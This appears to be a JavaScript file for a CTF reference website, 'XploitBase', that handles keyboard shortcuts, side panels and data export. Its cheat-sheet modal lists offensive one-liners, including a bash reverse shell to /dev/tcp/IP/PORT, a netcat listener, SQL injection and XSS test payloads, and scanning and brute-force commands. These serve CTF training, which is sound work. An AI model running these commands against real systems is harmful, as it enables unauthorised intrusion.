// Keyboard Shortcuts for XploitBase

document.addEventListener('DOMContentLoaded', function() {
    // Keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Ctrl/Cmd + K - Focus search
        if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
            e.preventDefault();
            const searchInput = document.getElementById('searchInput');
            if (searchInput) {
                searchInput.focus();
                searchInput.select();
            }
        }
        
        // Ctrl/Cmd + H - Go to home
        if ((e.ctrlKey || e.metaKey) && e.key === 'h') {
            e.preventDefault();
            globalThis.location.href = 'index.html';
        }
        
        // Ctrl/Cmd + / - Show shortcuts help
        if ((e.ctrlKey || e.metaKey) && e.key === '/') {
            e.preventDefault();
            showShortcutsModal();
        }
        
        // Ctrl/Cmd + F - Toggle favorites panel
        if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
            e.preventDefault();
            toggleFavoritesPanel();
        }
        
        // Ctrl/Cmd + N - Toggle notes panel
        if ((e.ctrlKey || e.metaKey) && e.key === 'n') {
            e.preventDefault();
            toggleNotesPanel();
        }
        
        // Ctrl/Cmd + T - Toggle CTF timer
        if ((e.ctrlKey || e.metaKey) && e.key === 't') {
            e.preventDefault();
            toggleTimerPanel();
        }
        
        // Ctrl/Cmd + E - Export favorites/history
        if ((e.ctrlKey || e.metaKey) && e.key === 'e') {
            e.preventDefault();
            exportData();
        }
        
        // Ctrl/Cmd + Q - Quick cheat sheet
        if ((e.ctrlKey || e.metaKey) && e.key === 'q') {
            e.preventDefault();
            showCheatSheet();
        }
        
        // Esc - Close all modals and panels
        if (e.key === 'Escape') {
            closeAllModals();
        }
        
        // Ctrl/Cmd + B - Toggle theme
        if ((e.ctrlKey || e.metaKey) && e.key === 'b') {
            e.preventDefault();
            const themeToggle = document.getElementById('themeToggle');
            if (themeToggle) {
                themeToggle.click();
            }
        }
    });
    
    function showShortcutsModal() {
        let modal = document.getElementById('shortcutsModal');
        if (!modal) {
            modal = document.createElement('div');
            modal.id = 'shortcutsModal';
            modal.className = 'modal';
            modal.innerHTML = `
                <div class="modal-content" style="max-width: 600px;">
                    <span class="close" onclick="document.getElementById('shortcutsModal').style.display='none'">&times;</span>
                    <h2><i class="fas fa-keyboard"></i> Keyboard Shortcuts</h2>
                    <div class="shortcuts-list">
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>K</kbd>
                            <span>Focus search bar</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>H</kbd>
                            <span>Go to home</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>F</kbd>
                            <span>Toggle favorites panel</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>N</kbd>
                            <span>Toggle notes panel</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>T</kbd>
                            <span>Toggle CTF timer</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>Q</kbd>
                            <span>Quick cheat sheet</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>E</kbd>
                            <span>Export data</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>B</kbd>
                            <span>Toggle dark/light theme</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Ctrl/Cmd</kbd> + <kbd>/</kbd>
                            <span>Show this help</span>
                        </div>
                        <div class="shortcut-item">
                            <kbd>Esc</kbd>
                            <span>Close modals</span>
                        </div>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }
        modal.style.display = 'block';
    }
    
    function showCheatSheet() {
        let modal = document.getElementById('cheatSheetModal');
        if (!modal) {
            modal = document.createElement('div');
            modal.id = 'cheatSheetModal';
            modal.className = 'modal';
            modal.innerHTML = `
                <div class="modal-content" style="max-width: 900px; max-height: 90vh; overflow-y: auto;">
                    <span class="close" onclick="document.getElementById('cheatSheetModal').style.display='none'">&times;</span>
                    <h2><i class="fas fa-book-open"></i> CTF Quick Reference Cheat Sheet</h2>
                    
                    <div class="cheat-sheet-section">
                        <h3><i class="fas fa-terminal"></i> Common Commands</h3>
                        <div class="cheat-grid">
                            <div class="cheat-item">
                                <strong>Netcat Listener:</strong>
                                <code>nc -lvnp 4444</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Reverse Shell:</strong>
                                <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Find SUID:</strong>
                                <code>find / -perm -4000 2&gt;/dev/null</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Python HTTP Server:</strong>
                                <code>python3 -m http.server 8000</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Base64 Decode:</strong>
                                <code>echo "string" | base64 -d</code>
                            </div>
                            <div class="cheat-item">
                                <strong>SQL Injection Test:</strong>
                                <code>' OR '1'='1</code>
                            </div>
                        </div>
                    </div>
                    
                    <div class="cheat-sheet-section">
                        <h3><i class="fas fa-lock"></i> Crypto Quick Refs</h3>
                        <div class="cheat-grid">
                            <div class="cheat-item">
                                <strong>ROT13:</strong>
                                <code>tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>
                            </div>
                            <div class="cheat-item">
                                <strong>MD5 Hash:</strong>
                                <code>echo -n "text" | md5sum</code>
                            </div>
                            <div class="cheat-item">
                                <strong>SHA256 Hash:</strong>
                                <code>echo -n "text" | sha256sum</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Hex to ASCII:</strong>
                                <code>echo "hex" | xxd -r -p</code>
                            </div>
                        </div>
                    </div>
                    
                    <div class="cheat-sheet-section">
                        <h3><i class="fas fa-network-wired"></i> Network</h3>
                        <div class="cheat-grid">
                            <div class="cheat-item">
                                <strong>Port Scan:</strong>
                                <code>nmap -sV -sC target</code>
                            </div>
                            <div class="cheat-item">
                                <strong>All Ports:</strong>
                                <code>nmap -p- target</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Enumerate SMB:</strong>
                                <code>enum4linux -a target</code>
                            </div>
                            <div class="cheat-item">
                                <strong>DNS Lookup:</strong>
                                <code>dig @server domain</code>
                            </div>
                        </div>
                    </div>
                    
                    <div class="cheat-sheet-section">
                        <h3><i class="fas fa-globe"></i> Web Exploitation</h3>
                        <div class="cheat-grid">
                            <div class="cheat-item">
                                <strong>Directory Brute:</strong>
                                <code>gobuster dir -u URL -w wordlist</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Subdomain Enum:</strong>
                                <code>ffuf -u https://FUZZ.target -w wordlist</code>
                            </div>
                            <div class="cheat-item">
                                <strong>SQLMap:</strong>
                                <code>sqlmap -u URL --dbs</code>
                            </div>
                            <div class="cheat-item">
                                <strong>XSS Test:</strong>
                                <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
                            </div>
                        </div>
                    </div>
                    
                    <div class="cheat-sheet-section">
                        <h3><i class="fas fa-file-code"></i> File Analysis</h3>
                        <div class="cheat-grid">
                            <div class="cheat-item">
                                <strong>Strings:</strong>
                                <code>strings file | grep flag</code>
                            </div>
                            <div class="cheat-item">
                                <strong>File Type:</strong>
                                <code>file filename</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Binwalk Extract:</strong>
                                <code>binwalk -e filename</code>
                            </div>
                            <div class="cheat-item">
                                <strong>Exiftool:</strong>
                                <code>exiftool filename</code>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }
        modal.style.display = 'block';
    }
    
    // Create shortcuts modal
    function toggleFavoritesPanel() {
        let panel = document.getElementById('favoritesPanel');
        if (!panel) {
            createFavoritesPanel();
            panel = document.getElementById('favoritesPanel');
        }
        panel.classList.toggle('active');
    }
    
    function toggleNotesPanel() {
        let panel = document.getElementById('notesPanel');
        if (!panel) {
            createNotesPanel();
            panel = document.getElementById('notesPanel');
        }
        panel.classList.toggle('active');
    }
    
    function toggleTimerPanel() {
        let panel = document.getElementById('timerPanel');
        if (!panel) {
            createTimerPanel();
            panel = document.getElementById('timerPanel');
        }
        panel.classList.toggle('active');
    }
    
    function closeAllModals() {
        const modals = document.querySelectorAll('.modal');
        modals.forEach(modal => modal.style.display = 'none');
        
        const panels = document.querySelectorAll('.side-panel');
        panels.forEach(panel => panel.classList.remove('active'));
    }
    
    function exportData() {
        const favorites = JSON.parse(localStorage.getItem('xploitbase_favorites') || '[]');
        const history = JSON.parse(localStorage.getItem('xploitbase_history') || '[]');
        const notes = JSON.parse(localStorage.getItem('xploitbase_notes') || '{}');
        
        const data = {
            favorites: favorites,
            history: history,
            notes: notes,
            exportDate: new Date().toISOString()
        };
        
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `xploitbase-export-${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        URL.revokeObjectURL(url);
        
        showToast('Data exported successfully!');
    }
    
    // Show keyboard shortcuts hint on first visit
    if (!localStorage.getItem('xploitbase_shortcuts_shown')) {
        setTimeout(() => {
            showToast('Press Ctrl/Cmd + / to view keyboard shortcuts', 5000);
            localStorage.setItem('xploitbase_shortcuts_shown', 'true');
        }, 2000);
    }
});

function showToast(message, duration = 3000) {
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => toast.classList.add('show'), 10);
    
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 500);
    }, duration);
}
